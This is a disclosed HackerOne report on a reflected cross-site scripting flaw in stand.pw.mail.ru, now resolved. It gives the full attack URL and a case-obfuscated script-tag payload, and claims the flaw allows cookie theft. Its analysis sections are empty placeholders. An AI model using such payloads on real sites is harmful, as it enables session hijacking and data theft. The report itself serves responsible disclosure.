---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1400197'
original_report_id: '1400197'
title: stand.pw.mail.ru xss
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: mailru
created_at: '2021-11-14T19:42:19.006Z'
disclosed_at: '2022-03-03T02:47:37.993Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 12
asset_identifier: Ext. B Scope
asset_type: OTHER
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# stand.pw.mail.ru xss

## Metadata

- HackerOne Report ID: 1400197
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: mailru
- Disclosed At: 2022-03-03T02:47:37.993Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

http://stand.pw.mail.ru:9100/news.php?archive=news&type=last"><sCrIpT>alert(1)</sCrIpT>&page=1

payload is:"><sCrIpT>alert(1)</sCrIpT>

## Impact

Can steal Cookie, Can run javascript code, and get information sensitive

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
